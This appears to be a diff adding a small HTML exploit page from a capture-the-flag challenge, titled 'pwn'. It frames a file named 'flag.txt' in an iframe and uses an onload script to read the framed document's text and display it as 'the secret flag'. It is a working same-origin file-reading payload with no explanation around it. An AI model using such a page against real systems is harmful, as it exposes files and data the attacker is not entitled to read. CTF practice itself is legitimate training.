@@ -1,0 +1,12 @@
+<html>
+<head>
+</head>
+<body>
+<br><BR><BR><BR>
+<h1>pwn<br>
+<iframe onload=j() src="flag.txt">xssxsxxsxs</iframe>
+<script type="text/javascript">
+    function j(){alert('The secret flag is:\n\n '+frames[0].document.body.innerText)}
+</script>
+</body>
+</html
